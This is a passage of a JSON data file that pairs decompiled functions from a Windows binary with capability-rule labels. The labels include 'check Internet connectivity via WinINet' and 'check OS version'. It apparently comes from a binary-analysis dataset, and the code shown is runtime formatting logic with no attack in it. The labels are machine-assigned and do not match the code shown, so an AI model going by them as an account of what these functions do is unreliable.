(**0x4742a4)(unaff_EBP + -0x84);\n        (**(iVar7 + 0x28))();\n        *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x84);\n        pcVar9 = *(*piVar3 + 0x1c);\n    }\n    else {\n        (**0x4742a4)();\n        (**(iVar7 + 0x2c))();\n        *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x84);\n        pcVar9 = *(*piVar3 + 0x20);\n    }\n    (**0x4742a4)(unaff_EBP + -0x70);\n    (*pcVar9)();\n    fcn.00404f80(unaff_EBP + -0x70);\n    fcn.00406350();\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 7;\n    *(unaff_EBP + -0x58) = 0;\n    *(unaff_EBP + -4) = 5;\n    if ((*(*(unaff_EBP + -0x90) + 0x14) & 8) != 0) {\n        pcVar9 = *(*piVar3 + 0x18);\n        (**0x4742a4)(unaff_EBP + -0x70);\n        (*pcVar9)();\n        fcn.00404f80(unaff_EBP + -0x70);\n        fcn.00406350();\n    }\n    cVar2 = '\\0';\n    uVar8 = 0;\n    *(unaff_EBP + -0x71) = 0;\n    uVar10 = 0;\n    do {\n        cVar1 = *(unaff_EBP + -0x7c + uVar10);\n        if (cVar1 == ' ') {\n            uVar8 = uVar8 + 1;\ncode_r0x0043091d:\n            if (uVar10 != 3) {\n                cVar2 = '\\x01';\n                *(unaff_EBP + -0x71) = 1;\n            }\n        }\n        else if (cVar1 == '$') {\n            uVar8 = uVar8 + *(unaff_EBP + -0x48);\n        }\n        else if (cVar1 == '+') {\n            uVar8 = uVar8 + *(unaff_EBP + -0x18);\n        }\n        else if (cVar1 == 'v') {\n            if (*(unaff_EBP + 0x34) < uVar4 || *(unaff_EBP + 0x34) == uVar4) {\n                iVar7 = (uVar4 - *(unaff_EBP + 0x34)) + 1;\n            }\n            else {\n                iVar7 = 0;\n            }\n            cVar2 = *(unaff_EBP + -0x71);\n            uVar8 = uVar8 + (uVar4 != 0) + *(unaff_EBP + 0x34) + iVar7;\n        }\n        else if (cVar1 == 'x') goto code_r0x0043091d;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 4);\n    iVar7 = *(unaff_EBP + -0x90);\n    uVar4 = *(iVar7 + 0x20);\n    if ((*(iVar7 + 0x24) < 0) || (((*(iVar7 + 0x24) < 1 && (uVar4 == 0)) || (uVar4 <= uVar8)))) {\n        arg_18h_00 = 0;\n    }\n    else {\n        arg_18h_00 = uVar4 - uVar8;\n    }\n    uVar4 = *(iVar7 + 0x14) & 0x1c0;\n    *(unaff_EBP + -0x94) = uVar4;\n    if ((uVar4 == 0x40) || ((uVar4 == 0x100 && (cVar2 != '\\0')))) {\n        uVar11 = *(unaff_EBP + 0x10);\n        arg_ch_00 = *(unaff_EBP + 0xc);\n    }\n    else {\n        puVar6 = fcn.00430c34(unaff_EBP + -0x88, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + -0x80), \n                              arg_18h_00);\n        arg_18h_00 = 0;\n        arg_ch_00 = *puVar6;\n        *(unaff_EBP + 0xc) = arg_ch_00;\n        uVar11 = puVar6[1];\n        *(unaff_EBP + 0x10) = uVar11;\n    }\n    uVar4 = 0;\n    *(unaff_EBP + -0x84) = 0;\n    do {\n        cVar2 = *(unaff_EBP + -0x7c + uVar4);\n        if (cVar2 == ' ') {\n            puVar6 = fcn.00430c34(unaff_EBP + -0xe8, arg_ch_00, uVar11, *(unaff_EBP + -0x80), 1);\n            arg_ch_00 = *puVar6;\n            *(unaff_EBP + 0xc) = arg_ch_00;\n            uVar11 = puVar6[1];\n            *(unaff_EBP + 0x10) = uVar11;\ncode_r0x00430b6c:\n            if (*(unaff_EBP + -0x94) != 0x100) goto code_r0x00430b9a;\n            puVar6 = fcn.00430c34(unaff_EBP + -0xa8, arg_ch_00, uVar11, *(unaff_EBP + -0x80), arg_18h_00);\n            arg_18h_00 = 0;\ncode_r0x00430b8f:\n            arg_ch_00 = *puVar6;\n            *(unaff_EBP + 0xc) = arg_ch_00;\n            uVar11 = puVar6[1];\n            *(unaff_EBP + 0x10) = uVar11;\n        }\n        else {\n            if (cVar2 == '$') {\n                iVar7 = unaff_EBP + -0x58;\n                if (7 < *(unaff_EBP + -0x44)) {\n                    iVar7 = *(unaff_EBP + -0x58);\n                }\n                var_18h = *(unaff_EBP + -0x48);\n                arg_8h_00 = unaff_EBP + -0xe0;\ncode_r0x004309f3:\n                puVar6 = fcn.00430084(arg_8h_00, arg_ch_00, uVar11, iVar7, var_18h);\n                goto code_r0x00430b8f;\n            }\n            if (cVar2 == '+') {\n                if (*(unaff_EBP + -0x18) != 0) {\n                    iVar7 = unaff_EBP + -0x28;\n                    if (7 < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    var_18h = 1;\n                    arg_8h_00 = unaff_EBP + -0xd8;\n                    goto code_r0x004309f3;\n                }\n            }\n            else {\n                if (cVar2 == 'v') {\n                    uVar4 = *(unaff_EBP + -0x78);\n                    if (uVar4 == 0) {\n                        iVar7 = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            iVar7 = *(unaff_EBP + 0x24);\n                        }\n                        var_18h = *(unaff_EBP + 0x34);\n                        arg_8h_00 = unaff_EBP + -0xb0;\n                    }\n                    else if (*(unaff_EBP + 0x34) < uVar4 || *(unaff_EBP + 0x34) == uVar4) {\n                        fcn.004294ea(*(unaff_EBP + -0x8c));\n                        pcVar9 = *(*piVar3 + 0xc);\n                        (**0x4742a4)();\n                        uVar4 = (*pcVar9)();\n                        fcn.004294ea(uVar4 & 0xffff);\n                        puVar6 = fcn.00430c34(unaff_EBP + -0xb8, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                                              *(unaff_EBP + -0x8c), *(unaff_EBP + -0x78) - *(unaff_EBP + 0x34));\n                        *(unaff_EBP + 0xc) = *puVar6;\n                        *(unaff_EBP + 0x10) = puVar6[1];\n                        iVar7 = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            iVar7 = *(unaff_EBP + 0x24);\n                        }\n                        var_18h = *(unaff_EBP + 0x34);\n                        uVar11 = puVar6[1];\n                        arg_8h_00 = unaff_EBP + -0xc0;\n                        arg_ch_00 = *puVar6;\n                    }\n                    else {\n                        *(unaff_EBP + -0x9c) = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            *(unaff_EBP + -0x9c) = *(unaff_EBP + 0x24);\n                        }\n                        puVar6 = fcn.00430084(unaff_EBP + -200, arg_ch_00, uVar11, *(unaff_EBP + -0x9c), \n                                              *(unaff_EBP + 0x34) - uVar4);\n                        *(unaff_EBP + 0xc) = *puVar6;\n                        *(unaff_EBP + 0x10) = puVar6[1];\n                        pcVar9 = *(*piVar3 + 0xc);\n                        (**0x4742a4)();\n                        uVar4 = (*pcVar9)();\n                        fcn.004294ea(uVar4 & 0xffff);\n                        iVar7 = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            iVar7 = *(unaff_EBP + 0x24);\n                        }\n                        var_18h = *(unaff_EBP + -0x78);\n                        iVar7 = iVar7 + *(unaff_EBP + 0x34) * 2 + var_18h * -2;\n                        uVar11 = *(unaff_EBP + 0x10);\n                        arg_8h_00 = unaff_EBP + -0xd0;\n                        arg_ch_00 = *(unaff_EBP + 0xc);\n                    }\n                    goto code_r0x004309f3;\n                }\n                if (cVar2 == 'x') goto code_r0x00430b6c;\n            }\n        }\ncode_r0x00430b9a:\n        uVar4 = *(unaff_EBP + -0x84) + 1;\n        *(unaff_EBP + -0x84) = uVar4;\n        if (3 < uVar4) {\n            if (1 < *(unaff_EBP + -0x18)) {\n                iVar7 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                puVar6 = fcn.00430084(unaff_EBP + -0xa8, arg_ch_00, uVar11, iVar7 + 2, *(unaff_EBP + -0x18) + -1);\n                arg_ch_00 = *puVar6;\n                *(unaff_EBP + 0xc) = arg_ch_00;\n                uVar11 = puVar6[1];\n                *(unaff_EBP + 0x10) = uVar11;\n            }\n            iVar7 = *(unaff_EBP + -0x90);\n            arg_14h_00 = *(unaff_EBP + -0x80);\n            *(iVar7 + 0x20) = 0;\n            *(iVar7 + 0x24) = 0;\n            fcn.00430c34(*(unaff_EBP + -0xa0), arg_ch_00, uVar11, arg_14h_00, arg_18h_00);\n            fcn.00406350();\n            fcn.00406350();\n            fcn.00406810();\n            fcn.00406350();\n            fcn.0043acb1();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 4501
    },
    "00429911": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00429911(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_14h = 0;\n    var_10h = 0;\n    fcn.00425817(&var_ch, arg_8h, &var_14h, in_ECX + 0x18);\n    fcn.0043a2e7(var_14h);\n    return;\n}\n",
        "token_count": 161
    },
    "00435185": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00435185(int32_t *arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) == '\\0') {\n        fcn.00430056();\n    }\n    if (*(arg_8h + 1) == '\\0') {\n        fcn.00430056();\n    }\n    if (*in_ECX == 0) {\n        if (*arg_8h != 0) {\n            return 0;\n        }\n    }\n    else if (*arg_8h == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 139
    },
    "00436241": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00436241(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    uint extraout_ECX;\n    char *pcVar7;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x10);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    fcn.00421bb3(*(*(unaff_EBP + 0x1c) + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.004218b0(unaff_EBP + -0x1c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x10) = piVar5;\n    fcn.00401990();\n    pcVar7 = *(unaff_EBP + 0x28);\n    puVar1 = *(unaff_EBP + 0x20);\n    do {\n        cVar4 = *pcVar7;\n        if (cVar4 == '\\0') {\ncode_r0x00436347:\n            cVar4 = fcn.00424ec3(unaff_EBP + 0x14);\n            if (cVar4 != '\\0') {\n                *puVar1 = *puVar1 | 1;\n            }\n            puVar6 = *(unaff_EBP + 8);\n            *puVar6 = *(unaff_EBP + 0xc);\n            puVar6[1] = *(unaff_EBP + 0x10);\n            fcn.0043ac9c();\n            return;\n        }\n        if (cVar4 == '%') {\n            pcVar7 = pcVar7 + 1;\n            iVar2 = **(unaff_EBP + -0x14);\n            (**0x4742a4)(unaff_EBP + -0x1c, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                         *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), puVar1, *(unaff_EBP + 0x24), *pcVar7, 0);\n            puVar6 = (**(iVar2 + 0x24))();\n            *(unaff_EBP + 0xc) = *puVar6;\n            *(unaff_EBP + 0x10) = puVar6[1];\ncode_r0x004362ff:\n            piVar5 = *(unaff_EBP + -0x10);\n        }\n        else {\n            if (cVar4 != ' ') {\n                if (*(unaff_EBP + 0x10) == '\\0') {\n                    fcn.00423d04();\n                }\n                pcVar3 = *(*piVar5 + 0x28);\n                (**0x4742a4)(*(unaff_EBP + 0x11), 0);\n                cVar4 = (*pcVar3)();\n                if (cVar4 == *pcVar7) {\n                    fcn.004234d8();\n                    goto code_r0x004362ff;\n                }\n                *puVar1 = *puVar1 | 2;\n                goto code_r0x00436347;\n            }\n            while (cVar4 = fcn.00424ec3(unaff_EBP + 0x14),  cVar4 == '\\0') {\n                if (*(unaff_EBP + 0x10) == '\\0') {\n                    fcn.00423d04();\n                }\n                if ((*(piVar5[3] + *(unaff_EBP + 0x11) * 2) & 0x48) == 0) break;\n                fcn.004234d8();\n            }\n        }\n        pcVar7 = pcVar7 + 1;\n    } while( true );\n}\n",
        "token_count": 1036
    },
    "0043652e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043652e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    bool bVar3;\n    char cVar4;\n    char cVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint8_t *puVar9;\n    int32_t iVar10;\n    char *pcVar11;\n    uint32_t uVar12;\n    int32_t unaff_EBP;\n    char *pcVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    char *pcVar16;\n    int32_t iVar17;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_64h;\n    uint var_60h;\n    uint var_59h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0xa8);\n    *(unaff_EBP + -0x6c) = 0;\n    iVar17 = *(unaff_EBP + 0xc);\n    uVar8 = *(*(unaff_EBP + 0x18) + 0x30);\n    *(unaff_EBP + -0x74) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0xb4) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x70) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x90) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0xb0) = iVar17;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0x1c);\n    fcn.00421bb3(uVar8);\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar6 = fcn.00435ae1(unaff_EBP + -0x88);\n        *(unaff_EBP + -100) = piVar6;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar6 = fcn.00435a3b(unaff_EBP + -0x88);\n        *(unaff_EBP + -100) = piVar6;\n    }\n    fcn.00401990();\n    *(unaff_EBP + -0x44) = 0xf;\n    *(unaff_EBP + -0x59) = 0;\n    *(unaff_EBP + -0x66) = 0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x58) = 0;\n    iVar14 = *piVar6;\n    *(unaff_EBP + -4) = 3;\n    pcVar1 = *(iVar14 + 0x2c);\n    (**0x4742a4)(unaff_EBP + -0x98);\n    (*pcVar1)();\n    puVar2 = *(unaff_EBP + -0x74);\n    *(puVar2 + 0x10) = 0;\n    *(puVar2 + 0x14) = 0xf;\n    *puVar2 = 0;\n    uVar12 = 1;\n    *(unaff_EBP + -0x60) = 1;\n    uVar8 = *(*(unaff_EBP + -0x90) + 0x30);\n    *(unaff_EBP + -0x6c) = 1;\n    fcn.00421bb3(uVar8);\n    *(unaff_EBP + -4) = 4;\n    piVar6 = fcn.004218b0(unaff_EBP + -0x88);\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x94) = piVar6;\n    fcn.00401990();\n    pcVar1 = *(*piVar6 + 0x1c);\n    (**0x4742a4)(\"0123456789-\", 0x475ca4, *(unaff_EBP + -0x8c));\n    (*pcVar1)();\n    uVar7 = 0;\n    *(unaff_EBP + -0x78) = 0;\n    do {\n        if (3 < uVar7) break;\n        cVar4 = *(unaff_EBP + -0x98 + uVar7);\n        if (cVar4 == ' ') {\ncode_r0x00436e5a:\n            if (*(unaff_EBP + -0x78) == 3) goto code_r0x004366af;\n            uVar8 = *(unaff_EBP + -0x70);\n            *(unaff_EBP + -0x65) = 0;\n            cVar4 = fcn.00424ec3(uVar8);\n            if (cVar4 == '\\0') {\n                iVar14 = *(unaff_EBP + -0x94);\n                do {\n                    if (*(iVar17 + 4) == '\\0') {\n                        fcn.00423d04();\n                    }\n                    if ((*(*(iVar14 + 0xc) + *(iVar17 + 5) * 2) & 0x48) == 0) break;\n                    *(unaff_EBP + -0x65) = 1;\n                    fcn.004234d8();\n                    cVar4 = fcn.00424ec3(uVar8);\n                } while (cVar4 == '\\0');\n                uVar12 = *(unaff_EBP + -0x60);\n            }\n            if ((*(unaff_EBP + -0x98 + *(unaff_EBP + -0x78)) != ' ') || (*(unaff_EBP + -0x65) != '\\0'))\n            goto code_r0x004366af;\n            cVar4 = '\\x01';\n            *(unaff_EBP + -0x59) = 1;\n        }\n        else {\n            if (cVar4 == '$') {\n                pcVar1 = *(**(unaff_EBP + -100) + 0x18);\n                (**0x4742a4)(unaff_EBP + -0x28);\n                (*pcVar1)();\n                uVar12 = uVar12 | 0x20;\n                *(unaff_EBP + -0x60) = uVar12;\n                *(unaff_EBP + -0x6c) = uVar12;\n                uVar8 = *(unaff_EBP + -0x70);\n                *(unaff_EBP + -4) = 5;\n                if (((*(*(unaff_EBP + -0x90) + 0x14) & 8) == 0) && (cVar4 = fcn.00424ec3(uVar8),  cVar4 == '\\0')) {\n                    if (*(iVar17 + 4) == '\\0') {\n                        fcn.00423d04();\n                    }\n                    pcVar16 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        pcVar16 = *(unaff_EBP + -0x28);\n                    }\n                    if (*(iVar17 + 5) == *pcVar16) goto code_r0x00436d97;\ncode_r0x00436dce:\n                    fcn.004351bf(0);\n                }\n                else {\ncode_r0x00436d97:\n                    if ((*(unaff_EBP + -0x78) == 3) && (*(unaff_EBP + -0x48) < 2)) {\n                        cVar4 = fcn.00424ec3(uVar8);\n                        if (cVar4 == '\\0') {\n                            if (*(iVar17 + 4) == '\\0') {\n                                fcn.00423d04();\n                            }\n                            pcVar16 = unaff_EBP + -0x28;\n                            if (0xf < *(unaff_EBP + -0x14)) {\n                                pcVar16 = *(unaff_EBP + -0x28);\n                            }\n                            if (*(iVar17 + 5) == *pcVar16) goto code_r0x00436dd8;\n                        }\n                        goto code_r0x00436dce;\n                    }\n                }\ncode_r0x00436dd8:\n                pcVar16 = unaff_EBP + -0x28;\n                if (0xf < *(unaff_EBP + -0x14)) {\n                    pcVar16 = *(unaff_EBP + -0x28);\n                }\n                cVar4 = fcn.00424ec3(*(unaff_EBP + -0x70));\n                if (cVar4 == '\\0') {\n                    uVar8 = *(unaff_EBP + -0x70);\n                    do {\n                        iVar14 = unaff_EBP + -0x28;\n                        if (0xf < *(unaff_EBP + -0x14)) {\n                            iVar14 = *(unaff_EBP + -0x28);\n                        }\n                        if (pcVar16 == *(unaff_EBP + -0x18) + iVar14) break;\n                        if (*(iVar17 + 4) == '\\0') {\n                            fcn.00423d04();\n                        }\n                        if (*(iVar17 + 5) != *pcVar16) break;\n                        pcVar16 = pcVar16 + 1;\n                        fcn.004234d8();\n                        cVar4 = fcn.00424ec3(uVar8);\n                    } while (cVar4 == '\\0');\n                    uVar12 = *(unaff_EBP + -0x60);\n                }\n                iVar14 = unaff_EBP + -0x28;\n                if (0xf < *(unaff_EBP + -0x14)) {\n                    iVar14 = *(unaff_EBP + -0x28);\n                }\n                if (pcVar16 != *(unaff_EBP + -0x18) + iVar14) {\n                    *(unaff_EBP + -0x59) = 1;\n                }\n                *(unaff_EBP + -4) = 3;\n            }\n            else if (cVar4 == '+') {\n                cVar4 = fcn.00424ec3(*(unaff_EBP + -0x70));\n                if (cVar4 != '\\0') goto code_r0x004366af;\n                pcVar1 = *(**(unaff_EBP + -100) + 0x1c);\n                (**0x4742a4)(unaff_EBP + -0x28);\n                (*pcVar1)();\n                *(unaff_EBP + -4) = 6;\n                *(unaff_EBP + -0x60) = uVar12 | 0x42;\n                *(unaff_EBP + -0x6c) = uVar12 | 0x42;\n                if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x00436b42:\n                    bVar3 = false;\n                }\n                else {\n                    pcVar1 = *(**(unaff_EBP + -100) + 0x1c);\n                    (**0x4742a4)(unaff_EBP + -0x40);\n                    (*pcVar1)();\n                    *(unaff_EBP + -4) = 7;\n                    pcVar16 = unaff_EBP + -0x40;\n                    *(unaff_EBP + -0x60) = uVar12 | 0xc6;\n                    *(unaff_EBP + -0x6c) = uVar12 | 0xc6;\n                    if (0xf < *(unaff_EBP + -0x2c)) {\n                        pcVar16 = *(unaff_EBP + -0x40);\n                    }\n                    if (*(iVar17 + 4) == '\\0') {\n                        fcn.00423d04();\n                    }\n                    if (*pcVar16 != *(iVar17 + 5)) goto code_r0x00436b42;\n                    bVar3 = true;\n                }\n                uVar7 = *(unaff_EBP + -0x60);\n                if ((uVar7 & 4) != 0) {\n                    *(unaff_EBP + -0x60) = uVar7 & 0xfffffffb;\n                    fcn.00406810();\n                    uVar7 = *(unaff_EBP + -0x60);\n                }\n                *(unaff_EBP + -4) = 3;\n                *(unaff_EBP + -0x60) = uVar7 & 0xfffffffd;\n                *(unaff_EBP + -0x6c) = uVar7 & 0xfffffffd;\n                fcn.00406810();\n                if (!bVar3) {\n                    piVar6 = *(unaff_EBP + -100);\n                    pcVar1 = *(*piVar6 + 0x20);\n                    (**0x4742a4)(unaff_EBP + -0x28);\n                    (*pcVar1)();\n                    uVar7 = *(unaff_EBP + -0x60) | 0x208;\n                    *(unaff_EBP + -4) = 8;\n                    *(unaff_EBP + -0x60) = uVar7;\n                    *(unaff_EBP + -0x6c) = uVar7;\n                    if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x00436c3a:\n                        bVar3 = false;\n                    }\n                    else {\n                        pcVar1 = *(*piVar6 + 0x20);\n                        (**0x4742a4)(unaff_EBP + -0x40);\n                        (*pcVar1)();\n                        pcVar16 = unaff_EBP + -0x40;\n                        uVar7 = *(unaff_EBP + -0x60) | 0x410;\n                        *(unaff_EBP + -4) = 9;\n                        *(unaff_EBP + -0x60) = uVar7;\n                        *(unaff_EBP + -0x6c) = uVar7;\n                        if (0xf < *(unaff_EBP + -0x2c)) {\n                            pcVar16 = *(unaff_EBP + -0x40);\n                        }\n                        if (*(iVar17 + 4) == '\\0') {\n                            fcn.00423d04();\n                            uVar7 = *(unaff_EBP + -0x60);\n                        }\n                        if (*pcVar16 != *(iVar17 + 5)) goto code_r0x00436c3a;\n                        bVar3 = true;\n                    }\n                    if ((uVar7 & 0x10) != 0) {\n                        *(unaff_EBP + -0x60) = uVar7 & 0xffffffef;\n                        fcn.00406810();\n                        uVar7 = *(unaff_EBP + -0x60);\n                    }\n                    *(unaff_EBP + -4) = 3;\n                    *(unaff_EBP + -0x60) = uVar7 & 0xfffffff7;\n                    *(unaff_EBP + -0x6c) = uVar7 & 0xfffffff7;\n                    fcn.00406810();\n                    if (bVar3) {\n                        fcn.004234d8();\n                        pcVar1 = *(**(unaff_EBP + -100) + 0x20);\n                        (**0x4742a4)(unaff_EBP + -0x40);\n                        (*pcVar1)();\n                        uVar12 = *(unaff_EBP + -0x60) | 0x800;\n                        *(unaff_EBP + -0x60) = uVar12;\n                        *(unaff_EBP + -0x6c) = uVar12;\n                        fcn.00405640(unaff_EBP + -0x40);\n                        fcn.00406810();\n                        *(unaff_EBP + -0x66) = 1;\n                    }\n                    else {\n                        pcVar1 = *(**(unaff_EBP + -100) + 0x1c);\n                        (**0x4742a4)(unaff_EBP + -0x40);\n                        (*pcVar1)();\n                        uVar7 = *(unaff_EBP + -0x60);\n                        iVar14 = *(unaff_EBP + -0x30);\n                        uVar12 = uVar7 | 0x1000;\n                        *(unaff_EBP + -0x60) = uVar12;\n                        *(unaff_EBP + -0x6c) = uVar12;\n                        fcn.00406810();\n                        if (iVar14 != 0) {\n                            pcVar1 = *(**(unaff_EBP + -100) + 0x20);\n                            (**0x4742a4)(unaff_EBP + -0x40);\n                            (*pcVar1)();\n                            iVar14 = *(unaff_EBP + -0x30);\n                            uVar12 = uVar7 | 0x3000;\n                            *(unaff_EBP + -0x60) = uVar12;\n                            *(unaff_EBP + -0x6c) = uVar12;\n                            fcn.00406810();\n                            cVar4 = *(unaff_EBP + -0x59);\n                            if (iVar14 == 0) {\n                                *(unaff_EBP + -0x66) = 1;\n                            }\n                            goto code_r0x004366b2;\n                        }\n                    }\n                    goto code_r0x004366af;\n                }\n                fcn.004234d8();\n                pcVar1 = *(**(unaff_EBP + -100) + 0x1c);\n                (**0x4742a4)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar12 = *(unaff_EBP + -0x60) | 0x100;\n                *(unaff_EBP + -0x60) = uVar12;\n                *(unaff_EBP + -0x6c) = uVar12;\n                fcn.00405640(unaff_EBP + -0x40);\n            }\n            else {\n                if (cVar4 != 'v') {\n                    if (cVar4 == 'x') goto code_r0x00436e5a;\n                    goto code_r0x004366af;\n                }\n                *(unaff_EBP + -0x80) = 0;\n                pcVar1 = *(**(unaff_EBP + -100) + 0x24);\n                (**0x4742a4)();\n                uVar8 = (*pcVar1)();\n                *(unaff_EBP + -0x7c) = uVar8;\n                pcVar1 = *(**(unaff_EBP + -100) + 0x14);\n                (**0x4742a4)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar12 = uVar12 | 0x4000;\n                *(unaff_EBP + -0x60) = uVar12;\n                *(unaff_EBP + -0x6c) = uVar12;\n                *(unaff_EBP + -4) = 10;\n                if (*(unaff_EBP + -0x30) == 0) {\ncode_r0x00436945:\n                    uVar8 = *(unaff_EBP + -0x70);\n                    while (cVar4 = fcn.00424ec3(uVar8),  cVar4 == '\\0') {\n                        if (*(iVar17 + 4) == '\\0') {\n                            fcn.00423d04();\n                        }\n                        *(unaff_EBP + -0xa4) = *(iVar17 + 5);\n                        uVar7 = fcn.00421578(*(unaff_EBP + -0x8c), *(unaff_EBP + -0xa4));\n                        if (9 < uVar7) break;\n                        *(unaff_EBP + -0xa8) = \"0123456789-\"[uVar7];\n                        fcn.0040c5c0(*(unaff_EBP + -0xa8));\n                        fcn.004234d8();\n                    }\ncode_r0x004369a5:\n                    pcVar1 = *(**(unaff_EBP + -100) + 0xc);\n                    (**0x4742a4)();\n                    cVar4 = (*pcVar1)();\n                    uVar8 = *(unaff_EBP + -0x70);\n                    cVar5 = fcn.00424ec3(uVar8);\n                    if ((cVar5 == '\\0') && (cVar4 != '\\0')) {\n                        if (*(iVar17 + 4) == '\\0') {\n                            fcn.00423d04();\n                        }\n                        if (*(iVar17 + 5) != cVar4) goto code_r0x00436a6d;\n                        fcn.004234d8();\n                        cVar4 = fcn.00424ec3(uVar8);\n                        iVar14 = *(unaff_EBP + -0x7c);\n                        iVar15 = *(unaff_EBP + -0x80);\n                        while (cVar4 == '\\0') {\n                            if (iVar14 <= iVar15) goto code_r0x00436a73;\n                            if (*(iVar17 + 4) == '\\0') {\n                                fcn.00423d04();\n                            }\n                            *(unaff_EBP + -0xac) = *(iVar17 + 5);\n                            uVar7 = fcn.00421578(*(unaff_EBP + -0x8c), *(unaff_EBP + -0xac));\n                            if (9 < uVar7) break;\n                            *(unaff_EBP + -0x84) = \"0123456789-\"[uVar7];\n                            fcn.0040c5c0(*(unaff_EBP + -0x84));\n                            iVar15 = iVar15 + 1;\n                            fcn.004234d8();\n                            cVar4 = fcn.00424ec3(*(unaff_EBP + -0x70));\n                        }\n                        if (iVar15 < iVar14) {\n                            *(unaff_EBP + -0x59) = 1;\n                        }\n                    }\n                    else {\ncode_r0x00436a6d:\n                        iVar14 = *(unaff_EBP + -0x7c);\n                        iVar15 = *(unaff_EBP + -0x80);\n                    }\ncode_r0x00436a73:\n                    if (*(*(unaff_EBP + -0x74) + 0x10) == 0) {\n                        *(unaff_EBP + -0x59) = 1;\n                    }\n                    else if (iVar15 < iVar14) {\n                        iVar14 = iVar14 - iVar15;\n                        